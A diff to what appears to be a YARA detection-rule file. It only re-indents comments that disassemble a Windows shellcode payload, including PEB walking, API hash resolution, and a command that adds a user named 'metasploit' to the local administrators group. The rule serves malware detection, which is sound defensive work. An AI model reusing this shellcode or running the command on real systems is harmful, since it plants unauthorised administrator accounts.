@@ -6,13 +6,13 @@
     
         /*
             FC                   | .                    | cld
-        E844000000           | .D...                | call startup
-        8B453C               | .E<                  | mov eax,[ebp+0x3c]
-        8B7C0578             | .|.x                 | mov edi,[ebp+eax+0x78]
-        01EF                 | ..                   | add edi,ebp
-        8B4F18               | .O.                  | mov ecx,[edi+0x18]
-        8B5F20               | ._                   | mov ebx,[edi+0x20]
-        01EB                 | ..                   | add ebx,ebp
+            E844000000           | .D...                | call startup
+            8B453C               | .E<                  | mov eax,[ebp+0x3c]
+            8B7C0578             | .|.x                 | mov edi,[ebp+eax+0x78]
+            01EF                 | ..                   | add edi,ebp
+            8B4F18               | .O.                  | mov ecx,[edi+0x18]
+            8B5F20               | ._                   | mov ebx,[edi+0x20]
+            01EB                 | ..                   | add ebx,ebp
         */
     
         strings:
@@ -30,10 +30,10 @@
     
         /*
             49                   | I                    | dec ecx
-        8B348B               | .4.                  | mov esi,[ebx+ecx*4]
-        01EE                 | ..                   | add esi,ebp
-        31C0                 | 1.                   | xor eax,eax
-        99                   | .                    | cdq
+            8B348B               | .4.                  | mov esi,[ebx+ecx*4]
+            01EE                 | ..                   | add esi,ebp
+            31C0                 | 1.                   | xor eax,eax
+            99                   | .                    | cdq
         */
     
         strings:
@@ -51,11 +51,11 @@
     
         /*
             AC                   | .                    | lodsb
-        84C0                 | ..                   | test al,al
-        7407                 | t.                   | jz hash_complete
-        C1CA0D               | ...                  | ror edx,0xd
-        01C2                 | ..                   | add edx,eax
-        EBF4                 | ..                   | jmp short next_byte
+            84C0                 | ..                   | test al,al
+            7407                 | t.                   | jz hash_complete
+            C1CA0D               | ...                  | ror edx,0xd
+            01C2                 | ..                   | add edx,eax
+            EBF4                 | ..                   | jmp short next_byte
         */
     
         strings:
@@ -73,16 +73,16 @@
     
         /*
             3B542404             | ;T$.                 | cmp edx,[esp+0x4]
-        75E5                 | u.                   | jnz next_entry
-        8B5F24               | ._$                  | mov ebx,[edi+0x24]
-        01EB                 | ..                   | add ebx,ebp
-        668B0C4B             | f..K                 | mov cx,[ebx+ecx*2]
-        8B5F1C               | ._.                  | mov ebx,[edi+0x1c]
-        01EB                 | ..                   | add ebx,ebp
-        8B1C8B               | ...                  | mov ebx,[ebx+ecx*4]
-        01EB                 | ..                   | add ebx,ebp
-        895C2404             | .\$.                 | mov [esp+0x4],ebx
-        C3                   | .                    | ret
+            75E5                 | u.                   | jnz next_entry
+            8B5F24               | ._$                  | mov ebx,[edi+0x24]
+            01EB                 | ..                   | add ebx,ebp
+            668B0C4B             | f..K                 | mov cx,[ebx+ecx*2]
+            8B5F1C               | ._.                  | mov ebx,[edi+0x1c]
+            01EB                 | ..                   | add ebx,ebp
+            8B1C8B               | ...                  | mov ebx,[ebx+ecx*4]
+            01EB                 | ..                   | add ebx,ebp
+            895C2404             | .\$.                 | mov [esp+0x4],ebx
+            C3                   | .                    | ret
         */
     
         strings:
@@ -100,22 +100,22 @@
     
         /*
             5F                   | _                    | pop edi
-        31F6                 | 1.                   | xor esi,esi
-        60                   | `                    | pusha
-        56                   | V                    | push esi
-        648B4630             | d.F0                 | mov eax,[fs:esi+0x30]
-        8B400C               | .@.                  | mov eax,[eax+0xc]
-        8B701C               | .p.                  | mov esi,[eax+0x1c]
-        AD                   | .                    | lodsd
-        8B6808               | .h.                  | mov ebp,[eax+0x8]
-        89F8                 | ..                   | mov eax,edi
-        83C06A               | ..j                  | add eax,byte +0x6a
-        50                   | P                    | push eax
-        68F08A045F           | h..._                | push dword 0x5f048af0
-        6898FE8A0E           | h....                | push dword 0xe8afe98
-        57                   | W                    | push edi
-        FFE7                 | ..                   | jmp edi
-        636D642E657865202F63206E65742075736572206D65746173706C6F69742078202F616464202626206E6574206C6F63616C67726F75702061646D696E6973747261746F7273206D65746173706C6F6974202F616464 | cmd.exe /c net user metasploit x /add && net localgroup administrators metasploit /add | #ommited# db "cmd.exe /c net user metasploit x /add && net localgroup administrators metasploit /add"
+            31F6                 | 1.                   | xor esi,esi
+            60                   | `                    | pusha
+            56                   | V                    | push esi
+            648B4630             | d.F0                 | mov eax,[fs:esi+0x30]
+            8B400C               | .@.                  | mov eax,[eax+0xc]
+            8B701C               | .p.                  | mov esi,[eax+0x1c]
+            AD                   | .                    | lodsd
+            8B6808               | .h.                  | mov ebp,[eax+0x8]
+            89F8                 | ..                   | mov eax,edi
+            83C06A               | ..j                  | add eax,byte +0x6a
+            50                   | P                    | push eax
+            68F08A045F           | h..._                | push dword 0x5f048af0
+            6898FE8A0E           | h....                | push dword 0xe8afe98
+            57                   | W                    | push edi
+            FFE7                 | ..                   | jmp edi
+            636D642E657865202F63206E65742075736572206D65746173706C6F69742078202F616464202626206E6574206C6F63616C67726F75702061646D696E6973747261746F7273206D65746173706C6F6974202F616464 | cmd.exe /c net user metasploit x /add && net localgroup administrators metasploit /add | #ommited# db "cmd.exe /c net user metasploit x /add && net localgroup administrators metasploit /add"
         */
     
         strings:
